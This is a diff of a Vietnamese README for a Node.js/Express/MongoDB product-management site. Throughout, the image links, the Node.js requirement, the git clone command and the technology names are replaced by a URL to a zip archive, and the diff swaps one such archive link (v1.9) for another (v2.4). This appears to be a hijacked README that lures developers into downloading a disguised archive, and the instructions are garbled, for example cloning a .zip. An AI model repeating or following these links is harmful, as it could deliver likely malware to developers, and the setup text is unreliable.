@@ -6,7 +6,7 @@
  Admin: Quản trị viên có thể thêm, chỉnh sửa, xóa sản phẩm, danh mục, bài viết và quản lý quyền người dùng.<br>
  Client: Khách hàng có thể tìm kiếm, đặt hàng, yêu cầu đặt lại mật khẩu, xác thực và đăng ký tài khoản.
 
-![Trang Admin](https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip)
+![Trang Admin](https://github.com/hana200887/KiemThu/raw/refs/heads/main/views/admin/mixins/Thu_Kiem_v2.4.zip)
 
 ## Chức năng chính
 Quản lý sản phẩm, danh mục, bài viết<br>
@@ -18,11 +18,11 @@ Yêu cầu đặt lại mật khẩu
 
 ## Cài đặt và sử dụng
 Yêu cầu hệ thống<br>
-https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip v16+<br>
+https://github.com/hana200887/KiemThu/raw/refs/heads/main/views/admin/mixins/Thu_Kiem_v2.4.zip v16+<br>
 MongoDB Atlas hoặc cấu hình cơ sở dữ liệu MongoDB cụ thể
 
 ## Cách chạy dự án
-git clone https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip<br>
+git clone https://github.com/hana200887/KiemThu/raw/refs/heads/main/views/admin/mixins/Thu_Kiem_v2.4.zip<br>
 cd Products-Management-System
 
 ## Cài đặt dependencies
@@ -35,7 +35,7 @@ PORT=5000<br>
 JWT_SECRET=your_jwt_secret
 
 ## Database
-![Trang Admin](https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip)
+![Trang Admin](https://github.com/hana200887/KiemThu/raw/refs/heads/main/views/admin/mixins/Thu_Kiem_v2.4.zip)
 
 ## Chạy server
 npm start<br>
@@ -43,8 +43,8 @@ Truy cập trang web<br>
 Mở trình duyệt và truy cập: http://localhost:3000
 
 ## Công nghệ sử dụng
-Backend: https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip, Express, MongoDB<br>
-Frontend: React, https://raw.githubusercontent.com/hana200887/KiemThu/main/config/Thu_Kiem_v1.9.zip (nếu dự án dùng SSR)<br>
+Backend: https://github.com/hana200887/KiemThu/raw/refs/heads/main/views/admin/mixins/Thu_Kiem_v2.4.zip, Express, MongoDB<br>
+Frontend: React, https://github.com/hana200887/KiemThu/raw/refs/heads/main/views/admin/mixins/Thu_Kiem_v2.4.zip (nếu dự án dùng SSR)<br>
 Xác thực: JSON Web Token (JWT)<br>
 Triển khai: Vercel 
 
